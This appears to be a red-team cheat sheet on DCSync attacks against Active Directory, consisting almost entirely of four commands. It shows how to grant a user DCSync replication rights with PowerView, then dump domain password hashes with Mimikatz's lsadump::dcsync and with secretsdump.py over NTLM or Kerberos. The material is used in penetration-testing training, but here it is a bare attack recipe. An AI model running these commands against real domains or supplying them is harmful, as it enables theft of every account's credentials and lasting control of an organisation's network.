---
legal-banner: true
---

### **INTRODUCTION**
Granting DCSync privileges allows a user to replicate domain data, which includes sensitive information such as password hashes. 

### **STEPS TO GRANT DCSYNC PRIVILEGES**

1. Grant DCSync Privileges using PowerView:   
	`Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync`

2. Perform a DCSync Attack with Mimikatz:   
	`Invoke-Mimikatz -Command '"lsadump::dcsync /user:[DOMAINNAME]\[ANYDOMAINUSER]"'`

3. DCSync Using NTLM Authentication:   
	`secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADRESS] -just-dc-ntlm`

4. Run secretsdump.py with Kerberos Authentication:   
	`secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm`